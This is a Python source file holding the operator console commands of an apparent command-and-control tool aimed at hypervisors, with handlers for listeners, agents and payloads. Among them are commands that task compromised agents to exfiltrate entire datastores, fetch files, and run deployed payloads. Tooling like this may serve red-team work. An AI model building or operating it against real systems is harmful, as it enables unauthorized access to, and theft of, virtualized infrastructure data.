import sys
import json
from common.cmdhelp import context_help, cmd_help

def do_help(self, cmd):
        """
        Offer help to the user. If the context is None, return general information.
        If the context is active (agent,listener,payload), return all available
        commands for that context.
        """
        if self.context:
            context_help(self.context.split(" ")[0])
        else:
            context_help(None)

def do_format(self, cmd):
    """
    Method to switch the formatting of returned data. Currently
    this only impacts auto-enumerated data for connected agents.
    """
    try:
        assert len(cmd.split()) == 1
    except AssertionError:
        context_help("format")
        return
    cmd = cmd.split()
    requested_format = cmd[0]
    try:
        assert requested_format in ["json", "table"]
    except AssertionError:
        context_help("format")
        return
    self.stdout_format = requested_format

def do_add(self, cmd):
    """
    Method to add a new listener
    """
    _COMMAND_CONTEXTS = ["listener"]
    if not self.check_context(_COMMAND_CONTEXTS): return

    try:
        assert len(cmd.split()) == 3
    except AssertionError:
        cmd_help("listener", "add")
        return
    cmd = cmd.split()
    host = cmd[0]
    port = cmd[1]
    secret = cmd[2]
    try:
        # TODO: Check port before a listener is attempted
        port = int(port)
    except ValueError:
        cmd_help("listener", "add")
        return
    self.add_listener(host, port, secret)

def do_remove(self, cmd):
    """
    Method to remove an active listener
    """
    _COMMAND_CONTEXTS = ["listener"]
    if not self.check_context(_COMMAND_CONTEXTS): return

    try:
        assert len(cmd.split()) == 1
    except AssertionError:
        cmd_help("listener", "remove")
        return
    cmd = cmd.split()
    listener_uuid = cmd[0]
    self.remove_listener(listener_uuid)

def do_list(self, cmd):
    """
    Method to list agents, listeners, and payloads
    """
    _COMMAND_CONTEXTS = ["listener", "payload", "agent"]
    if not self.check_context(_COMMAND_CONTEXTS): return

    if self.context == "listener":
        self.list_listener()
    if self.context == "payload":
        self.list_payload()
    if self.context == "agent":
        self.list_agent()

def do_ls(self, cmd):
    """
    Alias for the list command
    """
    self.do_list(cmd)

def do_interact(self, cmd):
    """
    Method to spawn an interactive terminal session
    with a connected agent
    """
    _COMMAND_CONTEXTS = ["agent"]
    if not self.check_context(_COMMAND_CONTEXTS): return

    try:
        assert len(cmd.split()) == 1
    except AssertionError:
        cmd_help("agent", "interact")
        return
    cmd = cmd.split()
    uuid = cmd[0]
    try:
        assert uuid in self.agents
    except AssertionError:
        print("Agent not found!")
        return

    print("Entering interactive session. Type exit to end session.")
    self.interactive = True
    self.agent = self.agents[uuid]
    self.update_prompt()

def do_exfil(self, cmd):
    """
    Method to exfiltrate an enumerated datastore
    from the hypervisor
    """
    _COMMAND_CONTEXTS = ["agent"]
    if not self.check_context(_COMMAND_CONTEXTS): return

    try:
        assert len(cmd.split()) == 2
    except AssertionError:
        cmd_help("agent", "exfil")
        return
    cmd = cmd.split()
    agent_uuid = cmd[0]
    datastore_uuid = cmd[1]
    try:
        assert agent_uuid in self.agents
    except AssertionError:
        print("Agent not found!")
        return

    selected_agent = self.agents[agent_uuid]

    # Check if the agent has any datastores enumerated
    try:
        assert "host_mounts" in selected_agent.enumdata["host_data"]
    except AssertionError:
        print("Agent has no enumerated datastores!")
        return
    
    # Check if the datastore exists on the agent
    try:
        assert datastore_uuid in selected_agent.enumdata["host_data"]["host_mounts"]
    except AssertionError:
        print("Datastore UUID not found: " + datastore_uuid)
        return

    # Get the datastore mountpoint from enumdata
    mountpoint = selected_agent.enumdata["host_data"]["host_mounts"][datastore_uuid]["mountpoint"]
    print(mountpoint)

    # Task the agent to compress and transfer the entire datastore
    exfil_task = {
        "cmd": "EXFIL_DATASTORE",
        "mountpoint": mountpoint
    }
    self.agents[agent_uuid].add_task(json.dumps(exfil_task))

def do_get(self, cmd):
    """
    Method to request a file transfer from an agent to the
    server
    """
    _COMMAND_CONTEXTS = ["agent"]
    if not self.check_context(_COMMAND_CONTEXTS): return

    try:
        assert len(cmd.split()) == 2
    except AssertionError:
        cmd_help("agent", "get")
        return
    cmd = cmd.split()
    uuid = cmd[0]
    file = cmd[1]
    try:
        assert uuid in self.agents
    except AssertionError:
        print("Agent not found!")
        return

    get_task = {
        "cmd": "GET_FILE",
        "file": file,
    }
    self.agents[uuid].add_task(json.dumps(get_task))

def do_use(self, cmd):
    """
    Method to select a payload
    """
    _COMMAND_CONTEXTS = ["payload"]
    if not self.check_context(_COMMAND_CONTEXTS): return

    try:
        assert len(cmd.split()) == 1
    except AssertionError:
        cmd_help("payload", "use")
        return
    cmd = cmd.split()
    payload_name = cmd[0]
    self.payload = self.payloads.get_payload_by_name(payload_name)
    if self.payload:
        self.update_prompt()
    else:
        self.payload = None
        print("Payload not found!")

def do_info(self, cmd):
    """
    Method to display information about a loaded payload or
    display enumerated data from an agent
    """
    _COMMAND_CONTEXTS = ["payload", "agent"]
    if not self.check_context(_COMMAND_CONTEXTS): return

    if self.context == "payload":
        if not self.payload:
            try:
                assert len(cmd.split()) == 1
            except AssertionError:
                cmd_help("payload", "info")
                return
            cmd = cmd.split()
            p = self.payloads.get_payload_by_name(cmd[0])
            if p:
                self.payloads.print_payloads_info(p)
            else:
                print("Payload not found!")
        else:
            self.payloads.print_payloads_info(self.payload)
    if self.context == "agent":
        try:
            assert len(cmd.split()) == 1
        except AssertionError:
            cmd_help("agent", "info")
            return
        cmd = cmd.split()
        uuid = cmd[0]
        try:
            assert uuid in self.agents
        except AssertionError:
            print("Agent not found!")
            return
        self.agent_info(self.agents[uuid])

def do_set(self, cmd):
    """
    Method that allows the user to modify payload settings
    """
    _COMMAND_CONTEXTS = ["payload"]
    if not self.check_context(_COMMAND_CONTEXTS): return

    try:
        assert self.payload is not None
    except AssertionError:
        print("No payload selected!")
        return
    try:
        assert len(cmd.split()) >= 2
    except AssertionError:
        cmd_help("payload", "set")
        return
    cmd = cmd.split()
    option = cmd[0]
    value = " ".join(cmd[1:])
    try:
        assert option in self.payload.options
    except AssertionError:
        print("Invalid option selected!")
        return

    # Translate between use input and special python types
    if value in ["False", "false", "0", 0]:
        self.payload.options[option]["value"] = False
    elif value in ["True", "true", "1", 1]:
        self.payload.options[option]["value"] = True
    elif value in ["None", "none"]:
        self.payload.options[option]["value"] = None
    else:
        self.payload.options[option]["value"] = value

def do_run(self, cmd):
    """
    Method to deploy a payload to a selected agent
    """
    _COMMAND_CONTEXTS = ["payload"]
    if not self.check_context(_COMMAND_CONTEXTS): return

    try:
        assert self.payload is not None
    except AssertionError:
        print("No payload selected!")
        return
    try:
        assert len(cmd.split()) == 2
    except AssertionError:
        cmd_help("payload", "run agent")
        # TODO: implement listener-level payload run
        # cmd_help('payload', 'run listener')
        return
    cmd = cmd.split()
    script = self.payload.gen_payload()
    if cmd[0] == "agent":
        uuid = cmd[1]
        try:
            assert uuid in self.agents
        except AssertionError:
            print("Agent not found!")
            return
        self.agents[uuid].add_payload(script)

def do_EOF(self, line):
    """
    Handle EOF
    """
    return True

def do_quit(self, cmd):
    """
    Method to exit reave
    """
    self.close_listeners()
    sys.stdout.write("\n")
    sys.exit(0)